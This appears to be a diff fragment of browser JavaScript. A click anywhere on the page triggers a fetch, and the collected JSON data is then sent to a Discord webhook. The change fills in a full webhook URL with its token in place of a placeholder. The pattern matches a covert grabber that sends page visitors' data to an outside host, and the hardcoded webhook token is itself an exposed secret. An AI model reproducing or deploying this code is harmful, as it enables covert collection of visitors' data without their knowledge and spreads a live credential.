@@ -24,7 +24,7 @@ document.body.onclick = async () => {
   const data = await res.json();
   
   // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-  const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // ← CRITICAL: REPLACE THIS
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1499130770881646652/I-TGuJlGuxeC1N12ATsn0hmnnQ8V4NbrvPg2NkGkDZWUhYNaRmzYa-DTTdK-iLJ-txc4"; // ← CRITICAL: REPLACE THIS
 
   // SEND DATA TO DISCORD
   const payload = {
